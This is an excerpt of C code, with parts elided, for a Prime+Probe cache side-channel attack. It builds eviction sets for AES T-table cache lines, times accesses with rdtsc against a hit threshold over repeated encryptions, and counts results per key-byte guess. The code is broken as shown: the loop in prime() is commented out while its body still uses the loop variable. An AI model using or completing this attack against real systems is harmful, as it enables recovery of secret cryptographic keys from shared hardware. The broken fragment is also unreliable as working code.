...
#define MIN_CACHE_HIT_CYCLES (240)
...
void prime(volatile register size_t idx) // cached
{
  ...
  // for (volatile register size_t i = 1; i < PROBE_COUNT; ++i)
  {
    // maccess((void *)faddrs[idx][i]);
    // maccess((void *)faddrs[idx][i+1]);
    // maccess((void *)faddrs[idx][i+2]);
    // maccess((void *)faddrs[idx][i]);
    // maccess((void *)faddrs[idx][i+1]);
    // maccess((void *)faddrs[idx][i+2]);
    *faddrs[idx][i];
...
int main()
{
  ...
  for (probe = base + te3; probe < base + te2; probe += 64) // 16    
    maccess(probe);
  ...
  for (probe = base + te3; probe < base + te2; probe += 64) // 16    
  {
    faddrs[(size_t)(probe-base-te3)/64][0] = (uint64_t*) probe;
  }
  ...
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    ...
    for (probe = base + te3; probe < base + te2; probe += 64) // 16    
    {
      if (faddrs[(size_t)(probe-base-te3)/64][1] == 0)
      {
        // printf("here");
        eviction_ptr = (uint8_t*)(((size_t)eviction & ~0xFFF) | ((size_t)faddrs[(size_t)(probe-base-te3)/64][0] & 0xFFF));
        pick(faddrs[(probe-base-te3)/64],1);
      }
      size_t count = 0;
      // printf("to prime idx: %d\n", (size_t)(probe-base-te3));
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        ...
        sched_yield();
        size_t time = rdtsc();
        prime(((size_t)(probe-base-te3))/64);
        size_t delta = rdtsc() - time;
        // printf("delta: %d\n", delta/5);
        if (delta/5 >= MIN_CACHE_HIT_CYCLES)
          ++count;
      }
      sched_yield();
